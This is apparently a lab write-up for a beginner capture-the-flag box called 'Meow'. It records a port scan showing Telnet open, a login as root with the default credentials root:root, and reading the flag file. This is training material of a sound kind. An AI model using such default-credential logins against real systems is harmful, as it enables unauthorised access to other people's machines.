# Meow — Tier 0

**Concept:** Initial access via Telnet on an open port with default credentials.

## Recon

```
PORT    STATE SERVICE
23/tcp  open  telnet
```

## Exploitation

### Step 1 — Telnet Login

Connected via Telnet and logged in with default credentials:

```
telnet 10.129.x.x
Username: root
Password: root
```

### Step 2 — Capture Flag

Once logged in, listed the directory and found the flag.

```
ls
cat flag.txt
```

## Findings

| Field | Value |
|-------|-------|
| Target IP | `10.129.x.x` |
| Service | Telnet (port 23) |
| Credentials | `root:root` |
| Attack Vector | Default credentials on Telnet |
